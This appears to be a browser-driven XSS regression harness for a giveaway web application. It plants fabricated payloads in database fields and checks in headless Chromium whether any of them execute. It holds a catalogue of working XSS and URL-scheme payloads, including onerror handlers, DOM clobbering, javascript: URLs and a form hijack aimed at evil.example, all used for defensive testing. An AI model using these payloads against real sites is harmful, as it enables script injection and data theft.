#!/usr/bin/env node
//
// Real-browser hostile-data run.
//
// Static analysis proves the source no longer contains a markup sink. It cannot
// prove the page is safe: a sink can be reintroduced through a helper, a value
// can reach a URL by a route the regex does not model, and a rendering bug that
// violates nothing at all (a silently unstyled element, an inert link that still
// looks clickable) is invisible to it. So the fabricated data goes into the
// database in every field a person can type into, the real server serves it, and
// real Chromium is asked what happened.
//
// Every payload family carries a distinct marker, so a hit names the field it
// came from rather than "something somewhere executed".
//
// Not part of `npm test`, and deliberately outside test/ so the node test
// runner does not pick it up: it drives a browser and takes minutes. CI runs it
// as its own required job. Run it against the isolated database with
//
//   TEST_DATABASE_URL=… npm run test:browser-security
//
// Everything it writes is fabricated and deleted afterwards.
const http = require('http');
const crypto = require('node:crypto');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const ROOT = path.join(__dirname, '..');
const { configureTestEnv } = require(path.join(ROOT, 'testEnv'));
configureTestEnv();

// Delivery details are encrypted at rest, and this run writes some. The key
// exists only for this process and is never written down — it must not borrow
// whatever the environment happens to hold.
process.env.CLAIM_ENCRYPTION_KEY = `v1:${crypto.randomBytes(32).toString('base64')}`;
delete process.env.CLAIM_ENCRYPTION_KEYS_PREVIOUS;
delete process.env.CLAIM_DEV_LOG_LINKS;

const request = require(path.join(ROOT, 'node_modules', 'supertest'));
const bcrypt = require(path.join(ROOT, 'node_modules', 'bcryptjs'));
const app = require(path.join(ROOT, 'server', 'app'));
const { pool, init } = require(path.join(ROOT, 'server', 'db'));
const { encryptDeliveryDetails } = require(path.join(ROOT, 'server', 'lib', 'claimCrypto'));

const APP_PORT = 45021;
const PROXY_PORT = 45022;
// Resolved rather than hard-coded, so the same command works on a developer's
// machine and on a CI runner that installed a pinned Playwright Chromium.
// headless_shell is preferred over the full chrome binary: --dump-dom on full
// Chrome needs an explicit --headless=new and produces an empty document
// without it, which reads exactly like a crashed page.
function resolveChrome() {
  if (process.env.CHROME_PATH) return { bin: process.env.CHROME_PATH, needsHeadlessFlag: true };
  const roots = [process.env.PLAYWRIGHT_BROWSERS_PATH, '/opt/pw-browsers'].filter(Boolean);
  const found = [];
  for (const root of roots) {
    if (!fs.existsSync(root)) continue;
    for (const dir of fs.readdirSync(root).filter((d) => d.startsWith('chromium'))) {
      for (const name of ['headless_shell', 'chrome']) {
        const candidate = path.join(root, dir, 'chrome-linux', name);
        if (fs.existsSync(candidate)) found.push({ bin: candidate, needsHeadlessFlag: name === 'chrome' });
      }
    }
  }
  const shell = found.find((f) => !f.needsHeadlessFlag);
  const chosen = shell || found[0];
  if (!chosen) {
    throw new Error(
      'No Chromium found. Set CHROME_PATH, or install one with: npx playwright install chromium'
    );
  }
  return chosen;
}
const { bin: CHROME, needsHeadlessFlag: CHROME_NEEDS_HEADLESS } = resolveChrome();

// ---------------------------------------------------------------------------
// Payload families
// ---------------------------------------------------------------------------
//
// Each is a complete attempt at one technique, and each leaves a different trace
// if it works: a marker pushed onto window.__pwn, a request to /__beacon/<id>,
// an element that should not exist, or a form pointing somewhere it should not.

const BEACON = (id) => `/__beacon/${id}`;

const FAMILIES = {
  breakout: (m) => `"><b id="brk-${m}" data-marker="${m}">${m}-BREAKOUT</b>`,
  imgError: (m) => `<img src="${BEACON(m + '-img')}" onerror="window.__pwn.push('${m}-IMG')">`,
  svgLoad: (m) => `<svg onload="window.__pwn.push('${m}-SVG')" id="svg-${m}"></svg>`,
  nested: (m) => `<<script>script>window.__pwn.push('${m}-NEST')<</script>/script>`,
  malformed: (m) => `<img src=x onerror=window.__pwn.push('${m}-MAL') <`,
  entities: (m) => `&lt;img src=x onerror=window.__pwn.push('${m}-ENT')&gt;&#60;svg&#62;`,
  closingTag: (m) => `</td></tr><tr><td id="esc-${m}">${m}-CLOSE</td></tr><tr><td>`,
  // id and name values chosen to shadow real references if they ever land in the
  // document: document.forms.api, window.session, window.NaseebDom.
  clobber: (m) => `"><div id="session"></div><form name="api" id="NaseebDom"></form><a id="clob-${m}"></a>`,
  formAction: (m) => `"><form id="hijack-${m}" action="https://evil.example/${m}"><input name="p"></form>`,
  cssBreakout: (m) => `x");background-image:url("${BEACON(m + '-css')}");color:red;content:("`,
  styleAttr: (m) => `" style="background-image:url('${BEACON(m + '-style')}')" data-x="`,
};

const URL_FAMILIES = {
  javascriptScheme: (m) => `javascript:window.__pwn.push('${m}-JSURL')`,
  javascriptMixedCase: (m) => `JaVaScRiPt:window.__pwn.push('${m}-JSMIX')`,
  javascriptTab: (m) => `java\tscript:window.__pwn.push('${m}-JSTAB')`,
  javascriptLeadingSpace: (m) => `   javascript:window.__pwn.push('${m}-JSWS')`,
  dataHtml: (m) => `data:text/html,<script>window.__pwn.push('${m}-DATA')</script>`,
  protocolRelative: (m) => `//evil.example/${m}.png`,
  credentials: (m) => `https://res.cloudinary.com@evil.example/${m}.png`,
  lookalike: (m) => `https://res.cloudinary.com.evil.example/${m}.png`,
  badPercent: (m) => `https://res.cloudinary.com/%zz-${m}.png`,
};

// One text payload per surface, cycling through the families so every family is
// exercised somewhere and every surface carries something hostile.
const familyNames = Object.keys(FAMILIES);
let familyCursor = 0;
function payloadFor(surface) {
  const family = familyNames[familyCursor % familyNames.length];
  familyCursor += 1;
  return { surface, family, value: FAMILIES[family](surface) };
}

const urlFamilyNames = Object.keys(URL_FAMILIES);
let urlCursor = 0;
function urlPayloadFor(surface) {
  const family = urlFamilyNames[urlCursor % urlFamilyNames.length];
  urlCursor += 1;
  return { surface, family, value: URL_FAMILIES[family](surface) };
}

const planted = [];
function plant(surface) {
  const p = payloadFor(surface);
  planted.push(p);
  return p.value;
}
function plantUrl(surface) {
  const p = urlPayloadFor(surface);
  planted.push(p);
  return p.value;
}

// ---------------------------------------------------------------------------
// In-page probe
// ---------------------------------------------------------------------------

const PROBE = `
(function () {
  window.__pwn = [];
  window.__violations = [];
  window.__errors = [];

  // Anything that manages to run is most likely to reach for one of these.
  ['alert', 'confirm', 'prompt'].forEach(function (name) {
    var original = window[name];
    window[name] = function () {
      window.__pwn.push('called:' + name);
      return name === 'confirm' ? false : null;
    };
    window['__real_' + name] = original;
  });

  window.addEventListener('error', function (e) {
    window.__errors.push('error: ' + e.message);
  });
  window.addEventListener('unhandledrejection', function (e) {
    window.__errors.push('rejection: ' + e.reason);
  });
  window.addEventListener('securitypolicyviolation', function (e) {
    window.__violations.push(e.violatedDirective + ' <- ' + (e.blockedURI || '(inline)'));
  });

  function survey() {
    var report = {
      pwn: window.__pwn,
      violations: window.__violations,
      errors: window.__errors,
      // Elements only a successful injection could have created.
      injected: [],
      forms: [],
      links: [],
      clobbered: [],
      requests: [],
    };

    ['[data-marker]', '[id^="brk-"]', '[id^="svg-"]', '[id^="esc-"]', '[id^="clob-"]',
     '[id^="hijack-"]', 'iframe', 'object', 'embed', 'svg[onload]', 'img[onerror]']
      .forEach(function (sel) {
        Array.prototype.forEach.call(document.querySelectorAll(sel), function (node) {
          // The verified-business badge is our own inline SVG.
          if (node.classList && node.classList.contains('verified-badge')) return;
          report.injected.push(sel + ' -> <' + node.tagName.toLowerCase() + ' id="' + node.id + '">');
        });
      });

    Array.prototype.forEach.call(document.querySelectorAll('form'), function (f) {
      report.forms.push(f.getAttribute('action') || '(none)');
    });

    Array.prototype.forEach.call(document.querySelectorAll('a[href]'), function (a) {
      var href = a.getAttribute('href') || '';
      if (!/^[/#]/.test(href) && !/^https?:\\/\\//i.test(href)) report.links.push(href);
      if (/^javascript:/i.test(href.replace(/[\\s\\u0000-\\u001f]/g, ''))) report.links.push(href);
    });

    // DOM clobbering: these must still be what the application defined.
    if (typeof window.NaseebDom !== 'object' || typeof window.NaseebDom.el !== 'function') {
      report.clobbered.push('window.NaseebDom');
    }
    if (document.forms && document.forms.api && typeof window.api !== 'function') {
      report.clobbered.push('document.forms.api shadowing api()');
    }
    if (document.getElementById('session')) report.clobbered.push('#session element exists');

    try {
      Array.prototype.forEach.call(performance.getEntriesByType('resource'), function (r) {
        if (r.name.indexOf('__beacon') !== -1) report.requests.push(r.name);
      });
    } catch (e) { /* resource timing unavailable */ }

    document.title = 'REPORT::' + JSON.stringify(report);
  }

  setTimeout(survey, 3000);
})();
`;

// ---------------------------------------------------------------------------
// Server + proxy
// ---------------------------------------------------------------------------

const beaconHits = [];
let COOKIE = null;

function proxyRequest(req, res) {
  if (req.url.startsWith('/__beacon/')) {
    // Any request here means a payload persuaded the browser to fetch
    // something. Recorded, then answered, so the page carries on.
    beaconHits.push(req.url);
    res.statusCode = 204;
    return res.end();
  }
  if (req.url === '/__probe.js') {
    res.setHeader('Content-Type', 'application/javascript');
    return res.end(PROBE);
  }
  const headers = { ...req.headers, 'accept-encoding': 'identity' };
  if (COOKIE) headers.cookie = COOKIE;
  const upstream = http.request(
    { host: '127.0.0.1', port: APP_PORT, path: req.url, method: req.method, headers },
    (up) => {
      const type = up.headers['content-type'] || '';
      const out = { ...up.headers };
      delete out['content-length'];
      delete out['transfer-encoding'];
      if (!type.includes('text/html')) {
        res.writeHead(up.statusCode, out);
        return up.pipe(res);
      }
      const chunks = [];
      up.on('data', (c) => chunks.push(c));
      up.on('end', () => {
        let body = Buffer.concat(chunks)
          .toString('utf8')
          .replace('</body>', '<script src="/__probe.js"></script></body>');
        // A green run is worthless if the detector cannot see red. With
        // HOSTILE_SELFTEST=1 the proxy injects a live payload into one page, and
        // the run must fail on it — proving the probe reports execution, an
        // injected element, a hijacked form and an unexpected request.
        if (process.env.HOSTILE_SELFTEST === '1' && req.url.startsWith('/index.html')) {
          body = body.replace(
            '</body>',
            '<b id="brk-SELFTEST" data-marker="SELFTEST">x</b>'
              + '<img src="/__beacon/SELFTEST" onerror="window.__pwn.push(\'SELFTEST\')">'
              + '<form id="hijack-SELFTEST" action="https://evil.example/SELFTEST"></form>'
              + '</body>'
          );
        }
        res.writeHead(up.statusCode, out);
        res.end(body);
      });
    }
  );
  upstream.on('error', (e) => { res.statusCode = 502; res.end(String(e)); });
  req.pipe(upstream);
}

function visit(url, clickSelectors) {
  return new Promise((resolve) => {
    const child = spawn(CHROME, [
      ...(CHROME_NEEDS_HEADLESS ? ['--headless=new'] : []),
      '--no-sandbox', '--disable-gpu', '--no-proxy-server',
      // No egress from this container. Failing external fetches fast keeps the
      // load event from waiting on a timeout; a payload aimed at our own
      // /__beacon path is still recorded, which is what actually matters.
      '--host-resolver-rules=MAP *.googleapis.com ~NOTFOUND,MAP *.gstatic.com ~NOTFOUND,'
        + 'MAP *.cloudinary.com ~NOTFOUND,MAP evil.example ~NOTFOUND,MAP *.evil.example ~NOTFOUND',
      '--virtual-time-budget=15000', '--timeout=40000',
      '--window-size=1280,900',
      '--dump-dom', url + (clickSelectors ? '' : ''),
    ], { encoding: 'utf8' });
    let out = '';
    let err = '';
    child.stdout.on('data', (c) => { out += c; });
    child.stderr.on('data', (c) => { err += c; });
    child.on('close', () => resolve({ dom: out, stderr: err }));
  });
}

// ---------------------------------------------------------------------------
// Seeding
// ---------------------------------------------------------------------------

const cleanup = { users: [], giveaways: [], ads: [], inquiries: [], claims: [], settings: [], privacyRequests: [] };

async function seed() {
  const suffix = Date.now().toString(36);
  const password = 'correcthorse123';
  const hash = await bcrypt.hash(password, 4);

  const hostId = crypto.randomUUID();
  const adminId = crypto.randomUUID();
  const winnerId = crypto.randomUUID();
  cleanup.users.push(hostId, adminId, winnerId);

  // Host display name — rendered on cards, the giveaway page, and the admin
  // tables. Suspended, so the rescue queue has something in it.
  await pool.query(
    `INSERT INTO users (id, name, email, password_hash, email_verified, host_status,
                        host_status_reason, host_status_changed_at)
     VALUES ($1, $2, $3, $4, TRUE, 'suspended', $5, NOW())`,
    [hostId, plant('host_name'), `hostile-host-${suffix}@example.com`, hash, plant('suspension_reason')]
  );
  await pool.query(
    `INSERT INTO users (id, name, email, password_hash, email_verified, is_admin, host_status)
     VALUES ($1, 'Hostile Data Admin', $2, $3, TRUE, TRUE, 'approved')`,
    [adminId, `hostile-admin-${suffix}@example.com`, hash]
  );
  await pool.query(
    `INSERT INTO users (id, name, email, password_hash, email_verified, host_status)
     VALUES ($1, $2, $3, $4, TRUE, 'not_requested')`,
    [winnerId, plant('winner_name'), `hostile-winner-${suffix}@example.com`, hash]
  );

  // Host application: every free-text field, plus the decision reason.
  const applicationId = crypto.randomUUID();
  await pool.query(
    `INSERT INTO host_applications
       (id, user_id, applicant_type, full_name, business_name, trade_license,
        contact_email, contact_phone, plan, message, status, decision_reason,
        decided_at, decided_by)
     VALUES ($1, $2, 'company', $3, $4, $5, $6, $7, $8, $9, 'rejected', $10, NOW(), $11)`,
    [
      applicationId, hostId,
      plant('application_full_name'), plant('application_business_name'),
      plant('application_trade_license'), `hostile-host-${suffix}@example.com`,
      plant('application_contact_phone'), plant('application_plan'),
      plant('application_message'), plant('rejection_reason'), adminId,
    ]
  );

  // Status events: approval, suspension and closure reasons.
  for (const [from, to, reason] of [
    ['not_requested', 'approved', plant('approval_reason')],
    ['approved', 'suspended', plant('suspension_event_reason')],
  ]) {
    await pool.query(
      `INSERT INTO host_status_events (id, user_id, from_status, to_status, reason, source, changed_by, application_id)
       VALUES ($1, $2, $3, $4, $5, 'admin', $6, $7)`,
      [crypto.randomUUID(), hostId, from, to, reason, adminId, applicationId]
    );
  }

  // Two giveaways: one live (cards, homepage, giveaway page) and one drawn with
  // a claim (claim page, rescue queue, delivery details).
  const liveId = crypto.randomUUID();
  const drawnId = crypto.randomUUID();
  cleanup.giveaways.push(liveId, drawnId);

  // Both campaigns are governed and approved, because that is what a published
  // campaign is now. The `drawn` one is seeded as closed and moved to drawn
  // below, once its winning entry exists — the schema refuses a drawn campaign
  // with no winner. Every field is a hostile payload except the ones the
  // governance CHECK constrains to an allowlist.
  for (const [id, status] of [[liveId, 'active'], [drawnId, 'closed_pending_draw']]) {
    const deadline = new Date(
      Date.now() + (status === 'active' ? 7 : -1) * 86400000
    ).toISOString();
    await pool.query(
      `INSERT INTO giveaways
         (id, host_id, title, description, prize_description, image_url,
          estimated_value_aed, entry_deadline, status, funded_by,
          published_at, closes_at, entry_target,
          approved_at, approved_by, review_notes,
          prize_category, sponsor_name, prize_supplied_by, prize_retail_value_aed,
          naseeb_custody, fulfilment_method, prize_restrictions,
          prize_evidence_kind, prize_evidence_reference, prize_evidence_verified,
          prize_evidence_verified_at, prize_evidence_verified_by,
          prize_governance_version, submitted_at,
          entries_closed_at, entries_closed_reason)
       VALUES ($1, $2, $3, $4, $5, $6, 1000, $7, $8, $9,
               NOW() - INTERVAL '1 hour', $10, 100,
               NOW() - INTERVAL '1 hour', $11, $12,
               'premium_electronics', $13, $14, 4500,
               'naseeb_holds', $15, $16,
               'prize_physically_inspected', $17, TRUE,
               NOW() - INTERVAL '1 hour', $11,
               1, NOW() - INTERVAL '2 hours',
               $18, $19)`,
      [
        id, hostId,
        plant(`giveaway_title_${status}`),
        plant(`giveaway_description_${status}`),
        plant(`giveaway_prize_${status}`),
        plantUrl(`giveaway_image_url_${status}`),
        deadline,
        status,
        plant(`funding_disclosure_${status}`),
        deadline,
        hostId,
        // Internal review text, planted so the page test proves it never renders.
        plant(`giveaway_review_notes_${status}`),
        plant(`giveaway_sponsor_${status}`),
        plant(`giveaway_supplier_${status}`),
        plant(`giveaway_fulfilment_${status}`),
        plant(`giveaway_restrictions_${status}`),
        plant(`giveaway_evidence_reference_${status}`),
        status === 'active' ? null : new Date().toISOString(),
        status === 'active' ? null : 'closing_deadline_reached',
      ]
    );
  }

  // The winner's entry, and the claim built on it.
  const entryId = crypto.randomUUID();
  await pool.query(
    `INSERT INTO entries (id, giveaway_id, user_id, ticket_number) VALUES ($1, $2, $3, 1)`,
    [entryId, drawnId, winnerId]
  );
  await pool.query(
    `UPDATE giveaways SET status = 'drawn', winner_entry_id = $1, drawn_at = NOW() WHERE id = $2`,
    [entryId, drawnId]
  );

  const claimId = crypto.randomUUID();
  cleanup.claims.push(claimId);
  // Courier, tracking and address text all live inside the encrypted delivery
  // blob, so they are encrypted the same way the application would write them.
  const delivery = encryptDeliveryDetails({
    recipient_name: plant('delivery_recipient_name'),
    phone: plant('delivery_phone'),
    address_line1: plant('delivery_address_line1'),
    address_line2: plant('delivery_address_line2'),
    city: plant('delivery_city'),
    emirate: plant('delivery_emirate'),
    notes: plant('delivery_notes_courier_tracking'),
  });
  await pool.query(
    `INSERT INTO prize_claims
       (id, giveaway_id, winner_user_id, entry_id, status, claimed_at, consent_version,
        consented_at, delivery_ciphertext, delivery_iv, delivery_tag, delivery_key_version)
     VALUES ($1, $2, $3, $4, 'claimed', NOW(), $5, NOW(), $6, $7, $8, $9)`,
    [
      claimId, drawnId, winnerId, entryId,
      plant('consent_version'),
      delivery.ciphertext, delivery.iv, delivery.tag, delivery.keyVersion,
    ]
  );

  // Claim history notes: the dispute reason and an administrative resolution.
  for (const [to, role, note] of [
    ['claimed', 'winner', plant('claim_note_winner')],
    ['disputed', 'winner', plant('dispute_reason')],
    ['claimed', 'admin', plant('admin_resolution_reason')],
  ]) {
    await pool.query(
      `INSERT INTO prize_claim_events (id, claim_id, from_status, to_status, actor_user_id, actor_role, note)
       VALUES ($1, $2, 'claimed', $3, $4, $5, $6)`,
      [crypto.randomUUID(), claimId, to, role === 'admin' ? adminId : winnerId, role, note]
    );
  }

  // The rescue queue entry an administrator will open.
  await pool.query(
    `INSERT INTO claim_rescue_queue (id, claim_id, giveaway_id, host_user_id, status, opened_reason, opened_by)
     VALUES ($1, $2, $3, $4, 'open', $5, $6)`,
    [crypto.randomUUID(), claimId, drawnId, hostId, plant('rescue_opened_reason'), adminId]
  );

  // Advertising: an inquiry from the public form, and a live banner.
  const inquiryId = crypto.randomUUID();
  cleanup.inquiries.push(inquiryId);
  await pool.query(
    `INSERT INTO ad_inquiries (id, business_name, contact_email, contact_phone, message)
     VALUES ($1, $2, $3, $4, $5)`,
    [
      inquiryId, plant('inquiry_business_name'),
      `hostile-inquiry-${suffix}@example.com`,
      plant('inquiry_contact_phone'), plant('inquiry_message'),
    ]
  );

  const adId = crypto.randomUUID();
  cleanup.ads.push(adId);
  await pool.query(
    `INSERT INTO ads (id, business_name, image_url, target_url, media_type, active)
     VALUES ($1, $2, $3, $4, 'image', TRUE)`,
    [adId, plant('ad_business_name'), plantUrl('ad_image_url'), plantUrl('ad_target_url')]
  );

  // The account centre reads back three things the person or an administrator
  // typed: a display name, the message on a privacy request, and the address on
  // a pending email change. All three land on /account.html.
  const requestId = crypto.randomUUID();
  cleanup.privacyRequests.push(requestId);
  await pool.query(
    `INSERT INTO privacy_requests
       (id, reference, user_id, request_type, status, user_message, outcome_code, admin_notes, blockers)
     VALUES ($1, $2, $3, 'correction', 'declined', $4, 'not_possible', $5, $6)`,
    [
      requestId,
      `PR-${crypto.randomBytes(4).toString('hex').toUpperCase()}`,
      winnerId,
      plant('privacy_request_message'),
      // Internal notes. These must not appear in the DOM at all — the page has
      // no field for them, and the harness reports every payload it can see.
      plant('privacy_request_admin_notes'),
      JSON.stringify([{ category: 'audit_records', count: null, note: plant('privacy_blocker_note') }]),
    ]
  );
  await pool.query(
    `INSERT INTO email_change_requests
       (id, user_id, token_hash, new_email, previous_email, status, expires_at)
     VALUES ($1, $2, $3, $4, $5, 'pending', NOW() + interval '2 hours')`,
    [
      crypto.randomUUID(),
      winnerId,
      crypto.createHash('sha256').update(crypto.randomBytes(32)).digest('hex'),
      `hostile-newaddr-${suffix}@example.com`,
      `hostile-winner-${suffix}@example.com`,
    ]
  );

  // Owner-configured text.
  for (const [key, value] of [
    ['maintenance_message', plant('owner_maintenance_message')],
    ['maintenance_mode', 'true'],
  ]) {
    cleanup.settings.push(key);
    await pool.query(
      `INSERT INTO site_settings (key, value) VALUES ($1, $2)
       ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value`,
      [key, value]
    );
  }

  return { hostId, adminId, winnerId, liveId, drawnId, claimId, suffix, password };
}

async function unseed() {
  await pool.query('DELETE FROM prize_claim_events WHERE claim_id = ANY($1)', [cleanup.claims]);
  await pool.query('DELETE FROM claim_rescue_queue WHERE claim_id = ANY($1)', [cleanup.claims]);
  await pool.query('DELETE FROM prize_claims WHERE id = ANY($1)', [cleanup.claims]);
  // Detaching the winner means the campaign is no longer drawn, and the schema
  // says so. Teardown moves the state with the data rather than leaving an
  // incoherent row behind.
  await pool.query(
    `UPDATE giveaways
        SET winner_entry_id = NULL, drawn_at = NULL,
            status = CASE WHEN status = 'drawn' THEN 'closed_pending_draw' ELSE status END
      WHERE id = ANY($1)`,
    [cleanup.giveaways]
  );
  await pool.query('DELETE FROM entries WHERE giveaway_id = ANY($1)', [cleanup.giveaways]);
  await pool.query('DELETE FROM giveaways WHERE id = ANY($1)', [cleanup.giveaways]);
  await pool.query('DELETE FROM ads WHERE id = ANY($1)', [cleanup.ads]);
  await pool.query('DELETE FROM ad_inquiries WHERE id = ANY($1)', [cleanup.inquiries]);
  await pool.query('DELETE FROM host_status_events WHERE user_id = ANY($1) OR changed_by = ANY($1)', [cleanup.users]);
  await pool.query('DELETE FROM host_applications WHERE user_id = ANY($1)', [cleanup.users]);
  await pool.query('DELETE FROM email_change_notifications WHERE user_id = ANY($1)', [cleanup.users]);
  await pool.query('DELETE FROM email_change_requests WHERE user_id = ANY($1)', [cleanup.users]);
  // privacy_requests, its events and its execution evidence all refuse DELETE at
  // the database. They are left alone on purpose, and with them the accounts
  // they point at — the isolated database is reset with DROP SCHEMA ... CASCADE.
  await pool.query('DELETE FROM sessions WHERE user_id = ANY($1)', [cleanup.users]);
  await pool.query('DELETE FROM session_families WHERE user_id = ANY($1)', [cleanup.users]);
  const carryingRequests = await pool.query(
    'SELECT DISTINCT user_id FROM privacy_requests WHERE user_id = ANY($1)',
    [cleanup.users]
  );
  const blocked = new Set(carryingRequests.rows.map((r) => r.user_id));
  const removable = cleanup.users.filter((id) => !blocked.has(id));
  if (removable.length) {
    await pool.query('DELETE FROM users WHERE id = ANY($1)', [removable]);
  }
  await pool.query('DELETE FROM site_settings WHERE key = ANY($1)', [cleanup.settings]);
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

(async () => {
  await init();
  const seeded = await seed();

  const server = app.listen(APP_PORT);
  const proxy = http.createServer(proxyRequest).listen(PROXY_PORT);
  await new Promise((r) => setTimeout(r, 300));

  async function cookieFor(email) {
    const agent = request.agent(app);
    const res = await agent
      .post('/api/auth/login')
      .set('Origin', process.env.APP_URL || 'http://localhost:3000')
      .set('X-Forwarded-For', '10.97.1.' + Math.floor(Math.random() * 240))
      .send({ email, password: seeded.password });
    if (res.status !== 200) throw new Error(`login failed ${res.status}: ${JSON.stringify(res.body)}`);
    return res.headers['set-cookie'].map((c) => c.split(';')[0]).join('; ');
  }

  const hostCookie = await cookieFor(`hostile-host-${seeded.suffix}@example.com`);
  const adminCookie = await cookieFor(`hostile-admin-${seeded.suffix}@example.com`);
  const winnerCookie = await cookieFor(`hostile-winner-${seeded.suffix}@example.com`);

  // A payload in the query string and in the fragment, on the pages that read
  // them — the two places a visitor's own URL becomes displayed state.
  //
  // encodeURIComponent leaves !'()* alone, and headless Chromium refuses to
  // navigate to a command-line URL containing a raw apostrophe — it exits with
  // an empty DOM and no error, which reads exactly like a crashed page. Encoding
  // them here is a harness fix, not a product one; the browser still receives
  // the identical decoded payload.
  const encodeStrict = (value) =>
    encodeURIComponent(value).replace(/[!'()*]/g, (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase());
  const qs = encodeStrict(FAMILIES.breakout('query_string'));
  const frag = encodeStrict(FAMILIES.imgError('fragment'));
  planted.push({ surface: 'query_string', family: 'breakout', value: FAMILIES.breakout('query_string') });
  planted.push({ surface: 'fragment', family: 'imgError', value: FAMILIES.imgError('fragment') });

  const pages = [
    ['public giveaway page', `/giveaway.html?id=${seeded.drawnId}`, null],
    ['public giveaway (live)', `/giveaway.html?id=${seeded.liveId}`, null],
    ['home with hostile ad banner', '/index.html', null],
    ['winners', '/winners.html', null],
    ['dashboard (suspended host)', '/dashboard.html', hostCookie],
    ['create page (suspended host)', '/create.html', hostCookie],
    ['host application (rejected)', '/host-apply.html', hostCookie],
    ['claim page by fragment', `/claim.html#token=${frag}`, winnerCookie],
    ['claim page for the winner', `/giveaway.html?id=${seeded.drawnId}`, winnerCookie],
    ['admin application review', '/admin.html', adminCookie],
    ['admin rescue queue + suspension controls', '/admin.html', adminCookie],
    ['owner page', '/owner.html', adminCookie],
    ['account centre (hostile name, request and pending change)', '/account.html', winnerCookie],
    ['email-change confirmation by fragment', `/verify-email-change.html#token=${frag}`, null],
    ['admin privacy queue', '/admin.html', adminCookie],
    ['advertising inquiry / availability', '/advertise.html', null],
    ['login with hostile redirect', `/login.html?redirect=${qs}`, null],
    ['signup with hostile redirect', `/signup.html?redirect=${qs}`, null],
    ['error page (404)', `/no-such-page?q=${qs}`, null],
    ['verify with hostile token', `/verify.html?token=${qs}`, null],
    ['reset password with hostile token', `/reset-password.html?token=${qs}`, null],
  ];

  const results = [];
  for (const [label, urlPath, cookie] of pages) {
    COOKIE = cookie;
    const before = beaconHits.length;
    const { dom, stderr } = await visit(`http://127.0.0.1:${PROXY_PORT}${urlPath}`);

    let report = null;
    const match = dom.match(/REPORT::(\{[\s\S]*?\})<\/title>/);
    if (match) {
      try {
        report = JSON.parse(
          match[1].replace(/&quot;/g, '"').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>')
        );
      } catch (e) {
        report = { parseError: String(e), raw: match[1].slice(0, 200) };
      }
    }

    const consoleRefusals = stderr.split('\n').filter((l) => /Refused to|Uncaught|SyntaxError/i.test(l));
    const newBeacons = beaconHits.slice(before);

    // Which planted payloads actually reached this page, as inert text. A page
    // that renders none of them proves nothing, so this is reported alongside
    // the failures rather than left implicit.
    //
    // Matched on the surface name, which every family embeds verbatim. The
    // previous version regexed a marker out of the payload value and, for three
    // of the eleven families, extracted `__beacon` or `__pwn` — both of which are
    // in the injected probe on EVERY page. That inflated this count by a fixed
    // baseline on pages that render nothing hostile at all. It never affected a
    // pass/fail decision (those come from executions, beacons and violations),
    // but it made a diagnostic number mean less than it appeared to.
    const visible = planted.filter((p) => dom.includes(p.surface)).length;

    results.push({
      label, urlPath, report, consoleRefusals, newBeacons, domBytes: dom.length, visible,
      stderrTail: dom.length ? '' : stderr.split('\n').filter((l) => /ERROR|FATAL/.test(l)).slice(-4).join(' | '),
    });
  }

  // The rescue queue's delivery details open on a deliberate click, so they are
  // fetched the way the page fetches them and checked as data — the rendering
  // path for those fields is the same rescueRow() code the page run above
  // exercised.
  const adminAgent = request.agent(app);
  await adminAgent
    .post('/api/auth/login')
    .set('Origin', process.env.APP_URL || 'http://localhost:3000')
    .set('X-Forwarded-For', '10.97.9.9')
    .send({ email: `hostile-admin-${seeded.suffix}@example.com`, password: seeded.password });
  const csrf = (await adminAgent.get('/api/auth/session')).body.csrf_token;
  const details = await adminAgent
    .post(`/api/claims/${seeded.claimId}/rescue/delivery-details`)
    .set('Origin', process.env.APP_URL || 'http://localhost:3000')
    .set('X-CSRF-Token', csrf)
    .send({ reason: 'hostile-data verification run' });

  // ---------------------------------------------------------------------------
  // Report
  // ---------------------------------------------------------------------------

  console.log('\n=== SURFACES SEEDED ===');
  console.log(`${planted.length} fabricated payloads across ${new Set(planted.map((p) => p.surface)).size} surfaces`);
  const byFamily = {};
  planted.forEach((p) => { byFamily[p.family] = (byFamily[p.family] || 0) + 1; });
  console.log(Object.entries(byFamily).map(([k, v]) => `${k}×${v}`).join('  '));

  console.log('\n=== PAGES ===');
  let failures = 0;
  for (const r of results) {
    const rep = r.report || {};
    const problems = [];
    if (!r.report) problems.push('probe did not report' + (r.stderrTail ? ` — ${r.stderrTail}` : ''));
    if (rep.pwn && rep.pwn.length) problems.push(`EXECUTED: ${rep.pwn.join(', ')}`);
    if (rep.violations && rep.violations.length) problems.push(`CSP: ${rep.violations.join(', ')}`);
    if (rep.errors && rep.errors.length) problems.push(`JS: ${rep.errors.join(', ')}`);
    if (rep.injected && rep.injected.length) problems.push(`INJECTED: ${rep.injected.join(', ')}`);
    if (rep.links && rep.links.length) problems.push(`UNSAFE LINK: ${rep.links.join(', ')}`);
    if (rep.clobbered && rep.clobbered.length) problems.push(`CLOBBERED: ${rep.clobbered.join(', ')}`);
    if (rep.requests && rep.requests.length) problems.push(`BEACON (page): ${rep.requests.join(', ')}`);
    (rep.forms || []).forEach((action) => {
      if (action !== '(none)' && !action.startsWith('/')) problems.push(`FORM ACTION: ${action}`);
    });
    if (r.newBeacons.length) problems.push(`BEACON (server): ${r.newBeacons.join(', ')}`);
    if (r.consoleRefusals.length) problems.push(`CONSOLE: ${r.consoleRefusals.join(' | ')}`);

    if (problems.length) failures += 1;
    console.log(
      `${problems.length ? 'FAIL' : 'OK  '} ${r.label.padEnd(42)} bytes=${String(r.domBytes).padStart(7)}`
      + ` payloads-rendered=${String(r.visible).padStart(2)}`
      + (problems.length ? `\n       ${problems.join('\n       ')}` : '')
    );
  }

  console.log('\n=== DELIBERATE DELIVERY-DETAIL OPEN ===');
  console.log(`status ${details.status}, cache-control: ${details.headers['cache-control']}`);
  const returned = JSON.stringify(details.body);
  console.log(`payload text present in the JSON response: ${returned.includes('BREAKOUT') || returned.includes('onerror')}`
    + ' (expected: true — it is data, and it is rendered as text)');

  console.log('\n=== TOTALS ===');
  console.log(`pages clean: ${results.length - failures}/${results.length}`);
  console.log(`payload executions: ${results.reduce((n, r) => n + ((r.report && r.report.pwn) || []).length, 0)}`);
  console.log(`unexpected requests: ${beaconHits.length}`);
  console.log(`CSP violations: ${results.reduce((n, r) => n + ((r.report && r.report.violations) || []).length, 0)}`);
